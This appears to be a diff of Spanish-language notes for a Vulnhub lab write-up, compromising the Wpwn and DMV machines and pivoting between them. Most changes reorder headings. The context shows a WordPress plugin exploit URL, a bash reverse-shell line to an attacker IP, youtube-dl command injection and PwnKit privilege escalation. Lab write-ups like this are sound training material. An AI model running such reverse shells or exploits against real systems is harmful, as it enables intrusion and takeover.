@@ -1,10 +1,13 @@
-        [[Vulnhub]]
+[[Vulnhub]]
+
 Martes 20 de junio del 2023 CDMX, Polanco.
 Nota: En esta máquina hemos configurado una red interna VMnet3 para hacer un pivote hacia el DMV
 Valente Spiegel
 
 ---
-# Hablilidades.  [[Disiplinas.]]
+# Hablilidades. 
+
+[[Disiplinas.]]
 
 ### Wpwn "Linux Fácil"
 
@@ -26,10 +29,21 @@ Explotación de la utilidad web Youtube-dll (Inyección de comandos + SOCAT para
 Explotación de PwnKit CVE-2021-4034 [Escalada de privilegios]
 
 ---
-# Certificaciones.
+# Creación de directorios y espacio de trabajo.
 
-eWPT  
-eCPPTv2
+Es importante crear directorios o espacios de trabajo específicos al resolver una máquina.
+
+Al crear un directorio o espacio de trabajo dedicado para una máquina de VulnHub, puedes mantener ordenada toda la información relacionada con esa máquina en un solo lugar. Esto incluye archivos de configuración, resultados de escaneos, notas y cualquier otro dato relevante. Una estructura organizada facilita el seguimiento del progreso, el acceso rápido a la información y la revisión posterior de los pasos realizados.
+
+WpnwyDMV
+{Scan,Content,Exploits,Evidencia}
+
+```
+Mkdir WpnwyDMV && cd WpnwyDMV
+Mkdir {Scan,Contenta,Exploits} && ls && Scan
+```
+
+![[Captura de pantalla 2023-06-22 123231.png]]
 
 ---
 # Preparación del Laboratorio en VMware (1/2).
@@ -163,7 +177,12 @@ Para realizar esta asignación, abre el archivo "50-cloud-init.yaml" utilizando 
 
 ---
 
-# Fase de descubrimiento y enumeración. (1/2)
+
+---
+---
+# ==Wpwn.
+
+# Fase de descubrimiento y enumeración.
 
 
 El objetivo principal de la fase de descubrimiento es obtener una visión general de la red objetivo. Se busca identificar los dispositivos activos, como servidores, routers, y otros equipos de red, así como los servicios y aplicaciones que se ejecutan en ellos. Esto se logra mediante el uso de herramientas de escaneo de red.
@@ -189,25 +208,7 @@ Sin embargo, a menudo se asocia un valor de TTL de 64 con sistemas operativos ba
 
 ---
 
-# Creación de directorios oh espacio de trabajo.
 
-Es importante crear directorios o espacios de trabajo específicos al resolver una máquina.
-
-Al crear un directorio o espacio de trabajo dedicado para una máquina de VulnHub, puedes mantener ordenada toda la información relacionada con esa máquina en un solo lugar. Esto incluye archivos de configuración, resultados de escaneos, notas y cualquier otro dato relevante. Una estructura organizada facilita el seguimiento del progreso, el acceso rápido a la información y la revisión posterior de los pasos realizados.
-
-WpnwyDMV
-{Scan,Content,Exploits,Evidencia}
-
-```
-Mkdir WpnwyDMV && cd WpnwyDMV
-Mkdir {Scan,Contenta,Exploits} && ls && Scan
-```
-
-![[Captura de pantalla 2023-06-22 123231.png]]
-
----
-
-# Fase de descubrimiento y enumeración. (2/2)
 
 ==Escaneo de puertos:
 
@@ -294,7 +295,6 @@ El puerto 80/tcp es el puerto predeterminado utilizado por el protocolo HTTP (Hy
 ```
 
 ---
-
 # Escaneo web.
 
 ==Como sabemos que la maquina esta desplegando un servicio http desde el puerto 80, esta es nuestra principal puerta de entrada.
@@ -379,7 +379,8 @@ Al añadir esta regla, cuando se cargue la página web en el navegador, Burp Sui
 
 ---
 
-# Wordpress
+
+ Wordpress
 
 WordPress es un sistema de gestión de contenidos (CMS) muy popular que permite crear y administrar sitios web de manera sencilla y eficiente. En términos de ciberseguridad, existen varios aspectos importantes a considerar en relación a WordPress:
 
@@ -496,7 +497,7 @@ http://102.168.153.128/wordpress/wp-admin/admin-post.php?wsp_debug=load_options&
 
 ---
 
-# Reverse Shells
+# Reverse Shell
 
 HTTP Reverse Shell: En este caso, el objetivo comprometido establece una conexión HTTP con el atacante. El objetivo realiza una solicitud HTTP hacia una dirección específica donde el atacante está escuchando. El atacante procesa la solicitud y ejecuta comandos en el objetivo a través de la comunicación HTTP.
 
@@ -564,7 +565,7 @@ http://102.168.153.128/wordpress/wp-admin/admin-post.php?wsp_debug=load_options&
 ==Reverse Shell exitosa.
 
 ---
-# Tratamiento de la TTI (1/2)
+# Tratamiento de la TTI.
 
 ```
 echo $TERM
@@ -644,7 +645,9 @@ cat root
 ==Wpwn Pwned...
 
 ---
-# Pivoting  de Wpwn a DMV.
+
+---
+# ==Pivoting  de Wpwn a DMV.
 
 El objetivo principal del pivoting es escalar el acceso y expandir el control sobre la red objetivo. Una vez que se ha comprometido un sistema, el atacante puede utilizar técnicas como la escalada de privilegios, el robo de credenciales o la explotación de vulnerabilidades adicionales para moverse lateralmente en la red y acceder a sistemas más críticos o valiosos.
 El pivoting puede involucrar el uso de herramientas de acceso remoto, como el túnel SSH o el reenvío de puertos, para establecer conexiones desde el sistema comprometido hacia otros sistemas de la red. También puede implicar el uso de herramientas de escaneo y enumeración desde el sistema comprometido para descubrir otros sistemas, servicios y vulnerabilidades.
@@ -699,7 +702,12 @@ lsof -i:8081
 
 ---
 
-# Escalamiento a usuario.
+---
+
+---
+# ==DMV.
+
+# Escalamiento a usuario .
 
 ==Como se muestra en la petición web a nuestra máquina el servicio que despliega DMV parece ser una plataforma de descargas de videos de YouTube., Este tiene la posibilidad de un imput por parte del usuario.
 
@@ -782,12 +790,10 @@ bash -i >& /dev/TCP/10.10.18.128\1212
 ==Python3 nos representa que tubo una petición GET con estado 200 lo cual es el indicio que podemos pivotar de máquina en máquina.
 
 
-#  ==Usuario www-data Pwned.
+Usuario www-data Pwned.
 
 ---
-
-
-# Tratamiento de la TTI  DMV(2/2)
+# Tratamiento de la TTI.
 
 ```
 script /dev/null -c bash
@@ -806,7 +812,7 @@ export TERM=xterm
 
 ---
 
-# Escalamiento de privilegios root DMV.
+# Escalamiento de privilegios root.
 
 ==Cuando filtramos las aplicaciones que tiene dentro DMV se ve una aplicación vulnerable llamada pkexec
 
@@ -843,3 +849,5 @@ Whoami
 ```
 
 ![[Captura de pantalla 2023-06-23 151753.png]]
+
+---
